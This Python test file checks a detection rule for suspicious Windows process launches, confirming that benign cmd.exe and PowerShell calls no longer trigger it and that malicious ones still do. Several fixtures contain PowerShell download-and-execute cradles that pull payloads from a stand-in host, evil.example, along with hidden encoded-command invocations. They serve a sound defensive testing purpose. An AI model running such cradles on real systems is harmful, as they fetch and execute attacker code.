"""
Phase 15 detection quality / false-positive reduction (audit item D-1).

`SuspiciousProcessExecution` previously matched on bare substrings —
`'powershell' in raw or 'cmd.exe' in raw` — which flagged any invocation of
either interpreter regardless of arguments. Confirmed live before this fix
(not assumed) that this false-positives on ordinary, benign command lines
with no suspicious content at all. This file has two layers:

* Unit-level tests (`detection.rules.SuspiciousProcessExecution.match()`
  called directly against constructed objects) — fast, exhaustive coverage
  of positive/negative cases.
* Real-DB integration tests, same `_store_and_detect` helper pattern as
  `tests/test_phase13_detection.py` (real Postgres row, real
  `detection_engine.process_event`) — proving the fix holds through the
  full detection pipeline, not just the isolated rule, and that a case is
  genuinely NOT created for the benign fixtures.

No mocks of the systems under test in the integration tests, matching every
prior phase's standing rule.
"""
import uuid

import pytest
from sqlalchemy import select

from database.session import AsyncSessionLocal
from detection.rules import SuspiciousProcessExecution, _has_encoded_command_flag
from models.investigation import EvidenceItem
from tests.test_phase13_detection import _store_and_detect


class _FakeEvent:
    """Matches only the attributes SuspiciousProcessExecution.match()/explain() read
    (event_type, raw_log, metadata_) — avoids a real Event ORM row for the pure
    unit-level cases, where no DB/detection-engine behavior is under test."""

    def __init__(self, event_type: str, metadata: dict, raw_log: dict = None):
        self.event_type = event_type
        self.metadata_ = metadata
        self.raw_log = raw_log or {}


async def _match(metadata: dict) -> bool:
    """Async, not asyncio.run() — this suite runs inside pytest-asyncio's own
    session-managed event loop (conftest.py's custom `event_loop` fixture); a bare
    sync test calling asyncio.run() creates and closes a second event loop, which
    was found live to corrupt asyncio's default-loop state for every test running
    afterward in the same session (87 unrelated tests failed with "coroutine was
    never awaited" the first time this file used that pattern) - a real testing-
    infrastructure bug, fixed by making these tests properly async like every
    other test in this codebase, not a detection-logic issue."""
    rule = SuspiciousProcessExecution()
    event = _FakeEvent("Process Creation", metadata)
    return await rule.match(event)


# ============================================================= unit-level: negatives

@pytest.mark.asyncio
@pytest.mark.parametrize("label,metadata", [
    ("routine cmd.exe batch step", {"process_name": "cmd.exe", "command_line": "cmd.exe /c echo build succeeded"}),
    ("routine admin powershell script", {"process_name": "powershell.exe", "command_line": r"powershell.exe -File C:\Scripts\Get-DiskSpace.ps1"}),
    ("CI build step invoking cmd.exe", {"process_name": "cmd.exe", "command_line": r'"C:\Windows\System32\cmd.exe" /c npm run build'}),
    ("powershell module import, no flags", {"process_name": "powershell.exe", "command_line": "powershell.exe -Command \"Import-Module ActiveDirectory\""}),
    ("cmd.exe listing a directory", {"process_name": "cmd.exe", "command_line": "cmd.exe /c dir C:\\Temp"}),
])
async def test_ordinary_interpreter_invocations_no_longer_false_positive(label, metadata):
    assert await _match(metadata) is False, f"benign case '{label}' must not match"


@pytest.mark.asyncio
async def test_unrelated_encoding_flag_does_not_collide_with_encoded_command():
    """A tool with its own '-Encoding' parameter must not be confused with
    PowerShell's '-EncodedCommand' — the fix is token-precise, not substring-based."""
    assert await _match({"process_name": "sometool.exe", "command_line": "sometool.exe -Encoding UTF8 -File out.txt"}) is False


@pytest.mark.asyncio
async def test_empty_command_line_does_not_match():
    assert await _match({"process_name": "powershell.exe", "command_line": ""}) is False


# ============================================================= unit-level: positives (preserved)

@pytest.mark.asyncio
async def test_encoded_command_minimal_abbreviation_still_matches():
    assert await _match({"process_name": "powershell.exe", "command_line": "powershell.exe -NoP -NonI -W Hidden -enc SQBFAFgA"}) is True


@pytest.mark.asyncio
async def test_encoded_command_full_flag_name_still_matches():
    assert await _match({"process_name": "powershell.exe", "command_line": "powershell.exe -EncodedCommand SQBFAFgA"}) is True


@pytest.mark.parametrize("abbrev", ["-enc", "-enco", "-encod", "-encode", "-encoded", "-encodedc", "-encodedcommand"])
def test_all_unambiguous_prefixes_of_encodedcommand_match(abbrev):
    assert _has_encoded_command_flag(f"powershell.exe {abbrev} SQBFAFgA") is True


@pytest.mark.asyncio
async def test_d1_regression_fixture_still_matches_non_interpreter_process_name():
    """tests/test_phase13_detection.py's own D-1 multi-rule-overlap regression test
    depends on '7z.exe -enc ...' matching SuspiciousProcessExecution (deliberately, to
    exercise real rule overlap with DataStagingViaArchiveUtility on the same event) -
    this fix must not require an interpreter process_name, or that test would silently
    stop proving what it claims to prove."""
    assert await _match({"process_name": "7z.exe", "command_line": "7z.exe -enc a -tzip archive.zip sensitive.csv"}) is True


# ============================================================= unit-level: positives (new capability)

@pytest.mark.asyncio
@pytest.mark.parametrize("label,command_line", [
    ("Invoke-Expression + DownloadString cradle", "powershell.exe -c IEX (New-Object Net.WebClient).DownloadString('http://evil.example/payload.ps1')"),
    ("bare Invoke-Expression", "powershell.exe -Command \"Invoke-Expression $decoded\""),
    ("iex alias with DownloadFile", "powershell.exe -c \"iex (new-object net.webclient).downloadfile('http://evil.example/a.exe','a.exe')\""),
])
async def test_download_cradle_patterns_now_detected(label, command_line):
    assert await _match({"process_name": "powershell.exe", "command_line": command_line}) is True, label


def test_explain_names_the_specific_indicator_for_encoded_command():
    rule = SuspiciousProcessExecution()
    event = _FakeEvent("Process Creation", {"process_name": "powershell.exe", "command_line": "powershell.exe -enc SQBFAFgA"})
    explanation = rule.explain(event)
    assert "encoded" in explanation["description"].lower()


def test_explain_names_the_specific_indicator_for_download_cradle():
    rule = SuspiciousProcessExecution()
    event = _FakeEvent("Process Creation", {"process_name": "powershell.exe", "command_line": "powershell.exe -c IEX (New-Object Net.WebClient).DownloadString('http://evil.example/a.ps1')"})
    explanation = rule.explain(event)
    assert "download" in explanation["description"].lower() or "fileless" in explanation["description"].lower()


# ============================================================= real-DB integration

@pytest.mark.asyncio
async def test_benign_cmd_exe_invocation_creates_no_case_end_to_end():
    host = f"WORKSTATION-{uuid.uuid4().hex[:8]}"
    raw = {
        "timestamp": "2026-09-22T08:00:00Z",
        "hostname": host,
        "user_name": "developer",
        "source": "Sysmon",
        "event_type": "Process Creation",
        "severity": "INFO",
        "metadata": {"process_name": "cmd.exe", "command_line": "cmd.exe /c echo build succeeded"},
    }
    event, case = await _store_and_detect(raw)
    assert case is None

    async with AsyncSessionLocal() as session:
        evidence = (
            await session.execute(select(EvidenceItem).where(EvidenceItem.event_id == event.id))
        ).scalars().all()
    assert evidence == []


@pytest.mark.asyncio
async def test_benign_powershell_script_invocation_creates_no_case_end_to_end():
    host = f"WORKSTATION-{uuid.uuid4().hex[:8]}"
    raw = {
        "timestamp": "2026-09-22T08:01:00Z",
        "hostname": host,
        "user_name": "admin",
        "source": "Sysmon",
        "event_type": "Process Creation",
        "severity": "INFO",
        "metadata": {"process_name": "powershell.exe", "command_line": r"powershell.exe -File C:\Scripts\Get-DiskSpace.ps1"},
    }
    _, case = await _store_and_detect(raw)
    assert case is None


@pytest.mark.asyncio
async def test_download_cradle_creates_case_with_traceable_evidence_end_to_end():
    host = f"WORKSTATION-{uuid.uuid4().hex[:8]}"
    raw = {
        "timestamp": "2026-09-22T08:02:00Z",
        "hostname": host,
        "user_name": "victim",
        "source": "Sysmon",
        "event_type": "Process Creation",
        "severity": "HIGH",
        "metadata": {
            "process_name": "powershell.exe",
            "command_line": "powershell.exe -c IEX (New-Object Net.WebClient).DownloadString('http://evil.example/payload.ps1')",
        },
    }
    event, case = await _store_and_detect(raw)
    assert case is not None

    async with AsyncSessionLocal() as session:
        evidence = (
            await session.execute(select(EvidenceItem).where(EvidenceItem.event_id == event.id))
        ).scalars().first()
    assert evidence.evidence_type == "PROCESS_EXECUTION"
    assert "evil.example" in evidence.reason or "DownloadString" in evidence.reason or "download" in evidence.reason.lower()
